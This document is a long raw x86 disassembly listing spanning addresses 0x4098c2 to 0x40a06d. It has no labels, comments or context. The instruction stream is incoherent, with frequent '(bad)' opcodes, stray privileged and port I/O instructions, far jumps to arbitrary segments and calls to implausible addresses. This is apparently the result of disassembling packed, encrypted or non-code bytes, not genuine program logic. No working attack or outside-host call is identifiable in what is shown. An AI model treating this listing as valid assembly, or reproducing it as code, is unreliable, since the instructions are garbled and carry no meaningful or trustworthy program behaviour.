  4098c2:	enter  0x5728,0x89
  4098c6:	pop    edi
  4098c7:	test   edi,ebp
  4098c9:	mov    edx,0x6927e296
  4098ce:	test   al,0xaf
  4098d0:	addr16 pop edx
  4098d2:	adc    bl,BYTE PTR [edx+edi*4]
  4098d5:	mov    ebx,0xd0166665
  4098da:	xor    al,0x14
  4098dc:	ins    BYTE PTR es:[edi],dx
  4098dd:	leave  
  4098de:	addr16 leave 
  4098e0:	push   esi
  4098e1:	in     al,0x2f
  4098e3:	mov    edx,DWORD PTR [esi+ebp*2+0x41]
  4098e7:	cmp    al,0x3e
  4098e9:	dec    ebp
  4098ea:	inc    ebp
  4098eb:	imul   ecx,DWORD PTR [eax-0x75],0x835eca58
  4098f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f3:	lock cdq 
  4098f5:	ins    BYTE PTR es:[edi],dx
  4098f6:	xlat   BYTE PTR ds:[ebx]
  4098f7:	xor    al,0x63
  4098f9:	daa    
  4098fa:	pop    ebp
  4098fb:	lock sub edi,0x7283b25
  409902:	dec    ecx
  409903:	repz adc ah,BYTE PTR [edx-0x3b]
  409907:	test   DWORD PTR [ebx+0x5ef677ae],eax
  40990d:	aam    0xc9
  40990f:	and    eax,0xbbdae578
  409914:	cmp    edx,edi
  409916:	and    DWORD PTR [edi],esp
  409918:	cli    
  409919:	add    al,0x40
  40991b:	aad    0xb7
  40991d:	mov    eax,0x17bc4b85
  409922:	push   ecx
  409923:	dec    esp
  409924:	lods   al,BYTE PTR ds:[esi]
  409925:	mov    ebx,0xf57d623e
  40992a:	or     eax,0xfcb6f57c
  40992f:	sub    esi,edx
  409931:	(bad)  
  409932:	je     0x40993f
  409934:	push   es
  409935:	call   0xfef59390
  40993a:	sub    edi,DWORD PTR [ecx]
  40993c:	mov    ds:0xe93d16e1,eax
  409941:	add    dh,bh
  409943:	jg     0x40992b
  409945:	(bad)  
  409946:	es and eax,0x17eb5340
  40994c:	jle    0x409925
  40994e:	mov    esi,0x234f9aac
  409953:	das    
  409954:	hlt    
  409955:	xor    esp,DWORD PTR [esi-0x76a97f92]
  40995b:	aaa    
  40995c:	jo     0x409972
  40995e:	and    al,0xe0
  409960:	ret    0x963e
  409963:	sub    ebx,esp
  409965:	rcl    BYTE PTR [ebp+0x6a],0x5b
  409969:	or     al,dl
  40996b:	push   es
  40996c:	pop    ss
  40996d:	fadd   QWORD PTR [ecx]
  40996f:	lods   eax,DWORD PTR ds:[esi]
  409970:	adc    al,bl
  409972:	adc    esp,DWORD PTR [esi+eiz*4-0x3e]
  409976:	xchg   BYTE PTR [ebx-0x6fea55c6],dh
  40997c:	sub    eax,0x7b65ba7
  409981:	add    ecx,esi
  409983:	mov    dl,BYTE PTR [edx-0x54c2b8d6]
  409989:	pop    ecx
  40998a:	inc    ebx
  40998b:	fidiv  WORD PTR [esi+edx*8+0x73]
  40998f:	dec    BYTE PTR [esi+0x2c]
  409992:	dec    esp
  409993:	xor    DWORD PTR [ecx],eax
  409995:	add    eax,0x9a6ea868
  40999a:	int3   
  40999b:	es nop
  40999d:	or     al,0xf1
  40999f:	pusha  
  4099a0:	scas   al,BYTE PTR es:[edi]
  4099a1:	cmp    al,0x1c
  4099a3:	sub    cl,dh
  4099a5:	mov    esi,0xb0af4394
  4099aa:	(bad)  
  4099ab:	jb     0x409967
  4099ad:	xor    al,0x71
  4099af:	repz xchg ebp,eax
  4099b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099b2:	std    
  4099b3:	sbb    bh,BYTE PTR [ebx-0x4b6d9488]
  4099b9:	in     al,0xb7
  4099bb:	cmp    al,0xd8
  4099bd:	xchg   ebp,eax
  4099be:	sub    bl,BYTE PTR ds:0x3f65349d
  4099c4:	leave  
  4099c5:	and    dl,dl
  4099c7:	rcl    ebx,cl
  4099c9:	xchg   esi,esp
  4099cb:	outs   dx,BYTE PTR ds:[esi]
  4099cc:	std    
  4099cd:	std    
  4099ce:	mov    cl,cl
  4099d0:	ins    DWORD PTR es:[edi],dx
  4099d1:	retf   0x6675
  4099d4:	fcom   DWORD PTR [ecx]
  4099d6:	fmulp  st(2),st
  4099d8:	and    bh,BYTE PTR [ecx]
  4099da:	outs   dx,DWORD PTR ds:[esi]
  4099db:	lahf   
  4099dc:	dec    edi
  4099dd:	mov    esp,0x6a1bfb9b
  4099e2:	sti    
  4099e3:	add    dh,al
  4099e5:	aad    0x1b
  4099e7:	bound  esi,QWORD PTR [ecx+0xc]
  4099ea:	(bad)  
  4099eb:	fidiv  DWORD PTR [edi-0x6f]
  4099ee:	xor    ecx,DWORD PTR [esi-0x3c7e75c9]
  4099f4:	or     DWORD PTR [edx-0x3c],ebx
  4099f7:	adc    DWORD PTR [eax+0x7ec969a4],edi
  4099fd:	aas    
  4099fe:	pop    ecx
  4099ff:	mov    edi,edi
  409a01:	(bad)  
  409a02:	cmp    dh,ch
  409a04:	and    DWORD PTR [eax],esi
  409a06:	push   ecx
  409a07:	bound  eax,QWORD PTR [edi]
  409a09:	jo     0x409a20
  409a0b:	mov    ebx,0x1a582b1e
  409a10:	sbb    ebx,ecx
  409a12:	pop    ss
  409a13:	jns    0x4099fe
  409a15:	add    ch,0x6e
  409a18:	leave  
  409a19:	das    
  409a1a:	loop   0x409a63
  409a1c:	adc    eax,0xeded29a4
  409a21:	sbb    al,0xd2
  409a23:	or     BYTE PTR [edx-0x559f9cd9],al
  409a29:	push   0x3e83c4a7
  409a2e:	mov    ds:0x2ac41402,al
  409a33:	shl    ebx,1
  409a35:	scas   al,BYTE PTR es:[edi]
  409a36:	mul    BYTE PTR [esi]
  409a38:	loopne 0x409a51
  409a3a:	inc    esi
  409a3b:	in     al,0x52
  409a3d:	icebp  
  409a3e:	loop   0x409a83
  409a40:	clc    
  409a41:	mov    ah,BYTE PTR [edi-0x5d]
  409a44:	sti    
  409a45:	dec    esi
  409a46:	add    bh,BYTE PTR ds:0x769dd3e
  409a4c:	jb     0x409aa6
  409a4e:	shr    BYTE PTR [edi-0xaa4d437],1
  409a54:	test   DWORD PTR [esi+ebx*2+0x5e],esi
  409a58:	in     eax,0x9
  409a5a:	xor    ebx,esp
  409a5c:	pop    esp
  409a5d:	ja     0x409a50
  409a5f:	or     BYTE PTR [eax-0x4fffbe4b],ch
  409a65:	arpl   WORD PTR [ecx-0x6d1c4927],bx
  409a6b:	in     al,0x73
  409a6d:	xchg   esp,eax
  409a6e:	outs   dx,BYTE PTR ds:[esi]
  409a6f:	jbe    0x409a0d
  409a71:	ret    0x7e1f
  409a74:	mov    eax,ds:0xb2dc38d0
  409a79:	sbb    eax,0x7c091156
  409a7e:	inc    ecx
  409a7f:	cmp    al,0x6d
  409a81:	lds    edx,FWORD PTR [ebp-0x5]
  409a84:	mov    cl,BYTE PTR [eax-0x24e336b7]
  409a8a:	sbb    BYTE PTR [edx],al
  409a8c:	add    DWORD PTR [edi+0x5746e3f2],0xe068dff7
  409a96:	icebp  
  409a97:	sbb    al,0xda
  409a99:	inc    ebx
  409a9a:	mov    dl,0x59
  409a9c:	mov    ds:0xd8c7c5dd,eax
  409aa1:	clc    
  409aa2:	fsub   st,st(6)
  409aa4:	dec    esi
  409aa5:	cdq    
  409aa6:	jno    0x409a78
  409aa8:	xlat   BYTE PTR ds:[ebx]
  409aa9:	push   edx
  409aaa:	jo     0x409af8
  409aac:	data16 shr BYTE PTR [ebx+0x69],0xa5
  409ab1:	(bad)  
  409ab3:	test   BYTE PTR [esi+0x30],ch
  409ab6:	xor    esi,DWORD PTR [ecx+edi*8]
  409ab9:	mov    ebp,DWORD PTR [esi+0x273d7503]
  409abf:	mov    DWORD PTR [ecx-0x4e1a5238],ebx
  409ac5:	mov    eax,0xf807f601
  409aca:	xor    ecx,DWORD PTR [esi-0x74]
  409acd:	mov    esp,0x4a66c68c
  409ad2:	loop   0x409b1a
  409ad4:	(bad)  
  409ad5:	outs   dx,BYTE PTR ds:[esi]
  409ad6:	push   0xfd63334e
  409adb:	dec    ebx
  409adc:	in     eax,0x1
  409ade:	mov    BYTE PTR [ecx+eiz*1+0x5c],bh
  409ae2:	adc    eax,0x73832b01
  409ae7:	test   dh,cl
  409ae9:	shr    DWORD PTR [ecx],1
  409aeb:	ss out 0x6d,al
  409aee:	jp     0x409b5a
  409af0:	dec    ebx
  409af1:	pushf  
  409af2:	adc    dl,BYTE PTR [eax]
  409af4:	(bad)  
  409af5:	(bad)  
  409af6:	sbb    eax,0x8f44d81d
  409afb:	push   0xfffffffa
  409afd:	popf   
  409afe:	mov    ebp,0xf01cb031
  409b03:	inc    edx
  409b04:	jp     0x409b4a
  409b06:	shr    BYTE PTR [ecx+0x883130a],0x71
  409b0d:	sub    al,0x88
  409b0f:	call   0x1fc73a4f
  409b14:	cdq    
  409b15:	clc    
  409b16:	(bad)  
  409b17:	out    0x1,eax
  409b19:	push   esp
  409b1a:	sbb    BYTE PTR [edx*2-0x364a92a7],bl
  409b21:	cld    
  409b22:	sar    BYTE PTR [eax-0x4e64c41c],1
  409b28:	pop    edi
  409b29:	mov    DWORD PTR [edx],edx
  409b2b:	add    eax,0x55daab98
  409b30:	push   esi
  409b31:	mov    ch,0xa5
  409b33:	xor    DWORD PTR [ebx+0x2ffcb39f],eax
  409b39:	mov    esp,0xde2950a
  409b3e:	(bad)  
  409b3f:	test   al,0x9b
  409b41:	(bad)  [ebx]
  409b43:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b45:	add    DWORD PTR [edi+0xea4e721],0xffffff87
  409b4c:	and    ch,bh
  409b4e:	adc    eax,0x85d0d1c
  409b53:	pop    esi
  409b54:	mov    edi,ds
  409b56:	mov    ds:0x4cb05b6,eax
  409b5b:	psraw  mm6,QWORD PTR [ebp+0x3ca056e0]
  409b62:	or     al,0xf6
  409b64:	shl    BYTE PTR [edx],cl
  409b66:	push   esp
  409b67:	inc    eax
  409b68:	mov    ds:0x61e3ceb2,al
  409b6d:	pop    eax
  409b6e:	std    
  409b6f:	hlt    
  409b70:	js     0x409b6b
  409b72:	sub    ah,ah
  409b74:	push   eax
  409b75:	or     al,0x6e
  409b77:	add    bl,BYTE PTR [esi+0x57]
  409b7a:	ja     0x409b8d
  409b7c:	mov    edi,0xb6226b5f
  409b81:	push   es
  409b82:	shl    BYTE PTR [esp+eiz*8+0x552706b8],1
  409b89:	loop   0x409c02
  409b8b:	jno    0x409b3e
  409b8d:	inc    eax
  409b8e:	add    al,0x43
  409b90:	nop
  409b91:	test   esi,ebx
  409b93:	(bad)
  409b97:	mov    ecx,0xf2211138
  409b9c:	repz jge 0x409b54
  409b9f:	lods   eax,DWORD PTR ds:[esi]
  409ba0:	pop    eax
  409ba1:	lods   al,BYTE PTR ds:[esi]
  409ba2:	fucomp st(5)
  409ba4:	shl    DWORD PTR [edx-0x3cede795],0x1b
  409bab:	xchg   esp,eax
  409bac:	out    0x31,al
  409bae:	ds dec edi
  409bb0:	xor    al,cl
  409bb2:	mov    bl,0x11
  409bb4:	push   esi
  409bb5:	fdiv   DWORD PTR [ebp-0x94f8192]
  409bbb:	loop   0x409b3d
  409bbd:	sbb    BYTE PTR [eax+0x39],dl
  409bc0:	inc    ebp
  409bc1:	mov    WORD PTR [ecx+0x41],gs
  409bc4:	cmp    DWORD PTR [edx+esi*2],0x1425b2fb
  409bcb:	loopne 0x409b93
  409bcd:	push   ebp
  409bce:	lahf   
  409bcf:	and    eax,0x7c038527
  409bd4:	push   es
  409bd5:	inc    ebx
  409bd6:	cld    
  409bd7:	sub    esi,esi
  409bd9:	lods   eax,DWORD PTR ds:[esi]
  409bda:	jg     0x409b6e
  409bdc:	xchg   ebp,eax
  409bdd:	xchg   DWORD PTR [ecx-0x4d2a9e6a],edi
  409be3:	(bad)  
  409be4:	xchg   ebp,eax
  409be5:	jne    0x409bf3
  409be7:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  409be9:	in     al,0x62
  409beb:	idiv   DWORD PTR [esi+ebp*8-0x54]
  409bef:	dec    edi
  409bf0:	scas   eax,DWORD PTR es:[edi]
  409bf1:	inc    ebp
  409bf2:	xchg   DWORD PTR [edx+0x32],edi
  409bf5:	repz jmp 0xe77a:0x49c6c55d
  409bfd:	mov    ebp,0x9e2de92e
  409c02:	mov    ds:0x9e3f3561,al
  409c07:	or     BYTE PTR [edx+0x47bbb4ae],0x84
  409c0e:	xor    al,0x19
  409c10:	xor    DWORD PTR [ebx],0xbb7208ac
  409c16:	mov    eax,ds:0x214bfc9c
  409c1b:	shl    edx,1
  409c1d:	popf   
  409c1e:	popa   
  409c1f:	and    DWORD PTR [esi-0x69],ecx
  409c22:	enter  0x68ce,0x44
  409c26:	test   BYTE PTR [edx+0x68],al
  409c29:	in     al,0x18
  409c2b:	out    dx,al
  409c2c:	sub    al,0xa6
  409c2e:	push   DWORD PTR [esi+0xf]
  409c31:	cmp    DWORD PTR cs:[ecx-0x49],ebx
  409c35:	adc    ebp,ebx
  409c37:	jge    0x409c87
  409c39:	retf   
  409c3a:	push   es
  409c3b:	pop    esp
  409c3c:	les    ebp,FWORD PTR ds:0xdaeb447c
  409c42:	push   0x18cca05c
  409c47:	std    
  409c48:	jmp    0x6a89:0x22dd50aa
  409c4f:	xor    DWORD PTR [ebx+ebx*8+0x5c],esp
  409c53:	test   BYTE PTR [ebp+0x52a7252e],dh
  409c59:	pop    edx
  409c5a:	xchg   esp,eax
  409c5b:	aas    
  409c5c:	dec    ebx
  409c5d:	jo     0x409bf2
  409c5f:	call   0x94182a2
  409c64:	jmp    0x409c62
  409c66:	loopne 0x409c11
  409c68:	add    dl,BYTE PTR [eax-0x7e]
  409c6b:	ss add ebp,edx
  409c6e:	loope  0x409ced
  409c70:	jns    0x409c26
  409c72:	shl    bl,cl
  409c74:	pop    edi
  409c75:	push   ds
  409c76:	inc    esi
  409c77:	xor    al,0xba
  409c79:	clc    
  409c7a:	int    0x5e
  409c7c:	or     edi,DWORD PTR [edx]
  409c7e:	mov    eax,DWORD PTR [ebp-0x68]
  409c81:	neg    BYTE PTR [ecx+0x1ca55a21]
  409c87:	out    dx,al
  409c88:	add    DWORD PTR [eax+0x74d4291e],ebx
  409c8e:	imul   BYTE PTR [ebp+0x7b]
  409c91:	lahf   
  409c92:	(bad)  
  409c93:	xor    esp,DWORD PTR [esi]
  409c95:	in     eax,dx
  409c96:	shl    DWORD PTR ds:0xb5e7f88a,1
  409c9c:	shl    BYTE PTR [edi+ecx*1],0xc
  409ca0:	ret    0x2f20
  409ca3:	dec    edi
  409ca4:	test   BYTE PTR [eax+0x78],0x2
  409ca8:	or     DWORD PTR [eax+0x77],0xc
  409cac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cad:	pop    ss
  409cae:	add    ecx,DWORD PTR [ebp-0x6f]
  409cb1:	mov    eax,ds:0x799e9fc3
  409cb6:	vpshlb ymm9,[ebx],xmm1
  409cbb:	push   0xffffffc4
  409cbd:	int3   
  409cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cbf:	jne    0x409c90
  409cc1:	or     esi,edx
  409cc3:	mov    eax,0x6ea43d11
  409cc8:	and    ch,dl
  409cca:	sbb    al,0x5f
  409ccd:	adc    al,0xa7
  409ccf:	inc    esp
  409cd0:	fidiv  DWORD PTR [ebp-0x1a]
  409cd3:	jno    0x409c7f
  409cd5:	fdivr  st,st(6)
  409cd7:	mov    esp,0x1ee33f7
  409cdc:	pop    ecx
  409cdd:	add    al,0x74
  409cdf:	call   0x3c0227ba
  409ce4:	in     eax,0xda
  409ce6:	push   edi
  409ce7:	sahf   
  409ce8:	xchg   ecx,eax
  409ce9:	lods   eax,DWORD PTR ds:[esi]
  409cea:	in     eax,dx
  409ceb:	pop    esp
  409cec:	mov    al,ds:0xe56dd90
  409cf1:	push   0x32349983
  409cf6:	adc    DWORD PTR [ecx+0x1619e3ef],esp
  409cfc:	jbe    0x409ce6
  409cfe:	aam    0xef
  409d00:	sub    BYTE PTR [edi+0x20e37909],al
  409d06:	xor    DWORD PTR [ebx],ebx
  409d08:	jmp    0x409d09
  409d0a:	scas   al,BYTE PTR es:[edi]
  409d0b:	nop
  409d0c:	ret    
  409d0d:	stc    
  409d0e:	add    eax,0xd0c2b2d5
  409d13:	or     eax,0xb33402c1
  409d18:	pop    edx
  409d19:	mov    ebp,0x624721d0
  409d1e:	outs   dx,DWORD PTR ds:[esi]
  409d1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d20:	stc    
  409d21:	out    dx,al
  409d22:	push   0x43
  409d24:	push   ss
  409d25:	dec    ebp
  409d26:	push   ebp
  409d27:	and    ch,bl
  409d29:	push   ss
  409d2a:	mov    al,0xe9
  409d2c:	dec    ebx
  409d2d:	pop    eax
  409d2e:	ins    DWORD PTR es:[edi],dx
  409d2f:	inc    esp
  409d30:	jle    0x409d1d
  409d32:	ins    BYTE PTR es:[edi],dx
  409d33:	dec    ebx
  409d34:	jp     0x409ce0
  409d36:	out    dx,eax
  409d37:	mov    edi,0x65da6f64
  409d3c:	out    0xcc,eax
  409d3e:	pop    ecx
  409d3f:	jns    0x409d03
  409d41:	xchg   ah,bl
  409d43:	enter  0x7926,0x95
  409d47:	cli    
  409d48:	adc    bh,BYTE PTR [eax-0x7f]
  409d4b:	push   edx
  409d4c:	repnz sar BYTE PTR [ebx],0xf0
  409d50:	and    DWORD PTR [esi-0x25],esi
  409d53:	out    dx,al
  409d54:	inc    edx
  409d55:	or     DWORD PTR [edi],ecx
  409d57:	xor    DWORD PTR [eax+0x78],ebp
  409d5a:	sbb    DWORD PTR [edi-0x25],0x98a4e1ff
  409d61:	mov    WORD PTR [ebx+0x758eb1b8],?
  409d67:	pop    ss
  409d68:	call   0x85eb6264
  409d6d:	jmp    0x9f64:0x31d5
  409d73:	mov    dh,BYTE PTR ds:0x3704e539
  409d79:	push   ecx
  409d7a:	outs   dx,DWORD PTR ds:[esi]
  409d7b:	adc    eax,0x4c185448
  409d80:	pop    ss
  409d81:	out    0xda,eax
  409d83:	jp     0x409d19
  409d85:	dec    ebx
  409d86:	or     edx,edi
  409d88:	fdiv   DWORD PTR [edi]
  409d8a:	mov    al,ds:0x75c3c0f8
  409d8f:	add    esp,DWORD PTR [eax*4-0x56b09e3]
  409d96:	adc    al,0x96
  409d98:	loopne 0x409d6f
  409d9a:	mov    gs,WORD PTR [ecx]
  409d9c:	cmp    esi,DWORD PTR [esi]
  409d9e:	mov    al,0xb9
  409da0:	add    DWORD PTR [ecx-0x40694d98],esi
  409da6:	xlat   BYTE PTR ds:[ebx]
  409da7:	push   es
  409da8:	cdq    
  409da9:	(bad)  
  409daa:	jle    0x409d49
  409dac:	xor    al,0x50
  409dae:	inc    ebx
  409daf:	push   0xfb7ebb7c
  409db4:	lods   eax,DWORD PTR ds:[esi]
  409db5:	ficom  DWORD PTR [ebp-0x6363282a]
  409dbb:	dec    ebp
  409dbc:	in     eax,dx
  409dbd:	js     0x409d8b
  409dbf:	add    edi,DWORD PTR [edx]
  409dc1:	xchg   esp,eax
  409dc2:	aam    0xe1
  409dc4:	jbe    0x409e10
  409dc6:	retf   0x4613
  409dc9:	pop    es
  409dca:	les    esp,FWORD PTR [ecx]
  409dcc:	sbb    BYTE PTR [edi-0x352d62b2],al
  409dd2:	cli    
  409dd3:	or     eax,0x69d3bb9d
  409dd8:	fst    QWORD PTR [eax-0x24]
  409ddb:	cmp    al,0x71
  409ddd:	push   ebx
  409dde:	mov    ds:0x542a4944,eax
  409de3:	sbb    eax,0x93354d6b
  409de8:	ins    DWORD PTR es:[edi],dx
  409de9:	sub    BYTE PTR [edi+edx*2-0x201aba30],dh
  409df0:	mov    ch,0xd
  409df2:	adc    DWORD PTR [esi],edi
  409df4:	jnp    0x409dbb
  409df6:	push   ds
  409df7:	sbb    DWORD PTR ds:0x6f3f,0xffffffcb
  409dfd:	pop    ebx
  409dfe:	enter  0x3e07,0xdb
  409e02:	xchg   ecx,eax
  409e03:	pop    esi
  409e04:	xor    cl,BYTE PTR [esi]
  409e06:	out    0x7,al
  409e08:	nop
  409e09:	dec    edx
  409e0a:	push   0x3642e504
  409e0f:	and    al,0xe5
  409e11:	lds    edi,FWORD PTR [ecx]
  409e13:	adc    esp,esp
  409e15:	not    BYTE PTR [ebx-0x7741b73c]
  409e1b:	mov    ebp,0xeda0e4a8
  409e20:	sbb    eax,0x7aea3de1
  409e25:	(bad)  
  409e26:	(bad)  
  409e27:	push   ebp
  409e28:	xchg   esi,eax
  409e29:	lock xchg edi,eax
  409e2b:	test   DWORD PTR [edi-0x48],esp
  409e2e:	iret   
  409e2f:	mov    dl,dl
  409e31:	push   eax
  409e32:	cmp    ebp,ebp
  409e34:	jecxz  0x409e85
  409e36:	push   ebp
  409e37:	push   es
  409e38:	scas   eax,DWORD PTR es:[edi]
  409e39:	fsubr  QWORD PTR cs:[esi+esi*1+0x37]
  409e3e:	mov    dl,0xda
  409e40:	imul   eax,esi,0xc7eee3c0
  409e46:	test   cl,dh
  409e48:	ret    0x6bcb
  409e4b:	lds    ebx,FWORD PTR [esi]
  409e4d:	dec    ebp
  409e4e:	sahf   
  409e4f:	aam    0xd4
  409e51:	pop    esp
  409e52:	adc    al,0x63
  409e54:	je     0x409e8b
  409e56:	fsub   QWORD PTR [esi+0x4f7191b9]
  409e5c:	cmp    DWORD PTR [edx+0x3c],0x9
  409e60:	inc    esp
  409e61:	or     al,0xd1
  409e63:	imul   edi,DWORD PTR [eax-0x18136f24],0x8582ae91
  409e6d:	(bad)
  409e70:	lds    ecx,FWORD PTR [ecx]
  409e72:	add    DWORD PTR [eax+0x40],edi
  409e75:	scas   al,BYTE PTR es:[edi]
  409e76:	push   ss
  409e77:	and    BYTE PTR [edx+0x69794007],bh
  409e7d:	adc    eax,0x6e63a99f
  409e82:	or     esi,ebx
  409e84:	fisubr DWORD PTR [esi]
  409e86:	in     eax,0x79
  409e88:	cdq    
  409e89:	ss push ecx
  409e8b:	dec    ebx
  409e8c:	jo     0x409eed
  409e8e:	into   
  409e8f:	cmc    
  409e90:	cs xchg ecx,eax
  409e92:	lock pop edi
  409e94:	popf   
  409e95:	sar    BYTE PTR [edi-0x408d9af6],cl
  409e9b:	jecxz  0x409e63
  409e9d:	sbb    eax,0x12d41086
  409ea2:	push   ecx
  409ea3:	or     al,0xe9
  409ea5:	jle    0x409e9a
  409ea7:	xor    ah,dl
  409ea9:	std    
  409eaa:	repz cld 
  409eac:	sbb    eax,0xe59b39ee
  409eb1:	jle    0x409e43
  409eb3:	stos   BYTE PTR es:[edi],al
  409eb4:	sbb    al,0xbe
  409eb6:	dec    eax
  409eb7:	pop    edi
  409eb8:	fisttp DWORD PTR [ebx+0x4e]
  409ebb:	mov    DWORD PTR ds:0x57c3e01e,edx
  409ec1:	jmp    0x409e5e
  409ec3:	jo     0x409e76
  409ec5:	stos   WORD PTR es:[edi],ax
  409ec7:	test   al,0x37
  409ec9:	lods   eax,DWORD PTR ds:[esi]
  409eca:	icebp  
  409ecb:	imul   esi,DWORD PTR [edi+0x48],0x303826bd
  409ed2:	sbb    cl,dl
  409ed4:	and    edx,DWORD PTR [edx-0x46]
  409ed7:	mov    dh,BYTE PTR [edi]
  409ed9:	fbstp  TBYTE PTR [eax]
  409edb:	mov    dl,0xe5
  409edd:	adc    al,0x34
  409edf:	inc    edx
  409ee0:	sahf   
  409ee1:	mov    ds:0xe752647,al
  409ee6:	push   ecx
  409ee7:	cli    
  409ee8:	add    ebx,edx
  409eea:	imul   edi,DWORD PTR [ebx],0xe5116fe7
  409ef0:	(bad)  [esi+0xf81dd21]
  409ef6:	ret    
  409ef7:	jl     0x409eaa
  409ef9:	mov    ds:0xaa015f13,eax
  409efe:	ins    BYTE PTR es:[edi],dx
  409eff:	out    0xd5,eax
  409f01:	daa    
  409f02:	std    
  409f03:	fnstsw WORD PTR [ebx-0x5a743dfb]
  409f09:	or     bh,BYTE PTR [ecx]
  409f0b:	mov    DWORD PTR ds:0xb97266,edi
  409f11:	in     al,0xc5
  409f13:	pop    ss
  409f14:	and    BYTE PTR [edi+ecx*1-0x9],ch
  409f18:	jl     0x409ee4
  409f1a:	mov    ah,0xf
  409f1c:	mul    DWORD PTR [edx+0x5fc944e]
  409f22:	push   ecx
  409f23:	pop    edx
  409f24:	(bad)  
  409f25:	adc    al,0xa0
  409f27:	out    0xba,eax
  409f29:	dec    eax
  409f2a:	pop    esi
  409f2b:	adc    BYTE PTR [edx],dl
  409f2d:	push   esi
  409f2e:	iret   
  409f2f:	inc    ecx
  409f30:	(bad)  
  409f32:	stos   DWORD PTR es:[edi],eax
  409f33:	pop    esi
  409f34:	inc    edx
  409f35:	out    dx,al
  409f36:	adc    DWORD PTR [ebp+0x59774a48],esi
  409f3c:	xor    DWORD PTR [eax-0x36889504],edx
  409f42:	hlt    
  409f43:	and    DWORD PTR [ebx+edx*1-0xc5d8308],edi
  409f4a:	mov    ebp,0x4666b20d
  409f4f:	stc    
  409f50:	into   
  409f51:	mov    ch,ah
  409f53:	or     eax,0x33113f71
  409f58:	int    0xeb
  409f5a:	push   ss
  409f5b:	retf   0xb0d6
  409f5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f5f:	in     al,0x32
  409f61:	sahf   
  409f62:	dec    esp
  409f63:	scas   eax,DWORD PTR es:[edi]
  409f64:	daa    
  409f65:	out    dx,al
  409f66:	mov    esp,0x3d7dceb4
  409f6b:	add    BYTE PTR [eax],ch
  409f6d:	mov    eax,DWORD PTR [ebp+0x6c]
  409f70:	mov    BYTE PTR [ecx],ch
  409f72:	xchg   ebx,eax
  409f73:	test   eax,0xef21154d
  409f78:	call   0x68458696
  409f7d:	aad    0x7
  409f7f:	inc    ebp
  409f80:	cdq    
  409f81:	cmp    ch,bl
  409f83:	dec    ebp
  409f84:	sub    dh,ch
  409f86:	cld    
  409f87:	push   edi
  409f88:	sub    al,0xdd
  409f8a:	stos   DWORD PTR es:[edi],eax
  409f8b:	mov    al,ds:0x7a7fe6f2
  409f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f91:	out    dx,al
  409f92:	stos   BYTE PTR es:[edi],al
  409f93:	fsubr  QWORD PTR [eax+edi*2-0x389ec774]
  409f9a:	dec    edi
  409f9b:	sbb    BYTE PTR [esi],cl
  409f9d:	std    
  409f9e:	ss mov eax,0xa26e3688
  409fa4:	les    esi,FWORD PTR [ecx]
  409fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fa7:	or     edx,DWORD PTR [esi+0x304df9ca]
  409fad:	pushw  cs
  409faf:	in     al,0xe2
  409fb1:	call   0x9f71:0x2eea547e
  409fb8:	xchg   ebp,eax
  409fb9:	outs   dx,BYTE PTR ds:[esi]
  409fba:	mov    eax,DWORD PTR [esi+ecx*2-0x2f]
  409fbe:	adc    BYTE PTR [edi+edi*1-0x2a5f888f],cl
  409fc5:	sub    eax,DWORD PTR [ebp-0x61]
  409fc8:	cmp    BYTE PTR [esi-0x23],dh
  409fcb:	into   
  409fcc:	and    bl,ch
  409fce:	inc    edx
  409fcf:	mov    ch,0x53
  409fd1:	push   ecx
  409fd2:	xchg   ebx,eax
  409fd3:	jo     0x40a017
  409fd5:	(bad)  
  409fd6:	jo     0x409feb
  409fd8:	push   ebx
  409fd9:	pop    edx
  409fda:	add    ah,dl
  409fdc:	cmp    al,0x5
  409fde:	das    
  409fdf:	jns    0x409ffb
  409fe1:	(bad)  
  409fe2:	test   al,0xa8
  409fe4:	xlat   BYTE PTR ds:[ebx]
  409fe5:	mov    bh,0xe3
  409fe7:	jbe    0x40a010
  409fe9:	push   0x4e
  409feb:	stos   BYTE PTR es:[edi],al
  409fec:	into   
  409fed:	int3   
  409fee:	stc    
  409fef:	xchg   ecx,eax
  409ff0:	xchg   esp,eax
  409ff1:	repz inc edi
  409ff3:	leave  
  409ff4:	out    dx,eax
  409ff5:	xchg   edi,eax
  409ff6:	cli    
  409ff7:	ins    BYTE PTR es:[edi],dx
  409ff8:	xor    BYTE PTR [edx-0x68cb1e7],dh
  409ffe:	xlat   BYTE PTR ds:[ebx]
  409fff:	sbb    BYTE PTR [ecx+0x6a],0xe7
  40a003:	inc    ecx
  40a004:	mov    ch,0xdb
  40a006:	and    eax,0x4dea51ba
  40a00b:	jmp    0xfa3e:0xcd4c766f
  40a012:	cdq    
  40a013:	xchg   edx,eax
  40a014:	arpl   bp,di
  40a016:	and    al,0x57
  40a018:	push   ss
  40a019:	(bad)  
  40a01a:	out    dx,al
  40a01b:	in     eax,0xc0
  40a01d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a01e:	fisubr WORD PTR [ebx-0x7a]
  40a021:	dec    ebx
  40a022:	js     0x40a06e
  40a024:	call   0x659f1dca
  40a029:	jmp    0x8c2974ae
  40a02e:	fsub   DWORD PTR [edi-0x56577e6c]
  40a034:	add    esp,edx
  40a036:	int    0xfc
  40a038:	pop    ebx
  40a039:	scas   eax,DWORD PTR es:[edi]
  40a03a:	ret    0xb938
  40a03d:	sti    
  40a03e:	cs xchg ecx,eax
  40a040:	cmp    ebx,0x10
  40a043:	pop    ebp
  40a044:	int    0xc5
  40a046:	fld    TBYTE PTR cs:[ebx+0x5960e8ff]
  40a04d:	jb     0x40a072
  40a04f:	xchg   ebx,eax
  40a050:	and    ah,dh
  40a052:	adc    DWORD PTR cs:[eax],ebp
  40a055:	cwde   
  40a056:	mov    ch,0x20
  40a058:	mov    ds:0x853565ae,eax
  40a05d:	call   0xb80c9906
  40a062:	sahf   
  40a063:	mov    ah,BYTE PTR [eax+0x791badd5]
  40a069:	enter  0x594a,0x7c
  40a06d:	sub    DWORD PTR ds:0xc97797ea,ecx
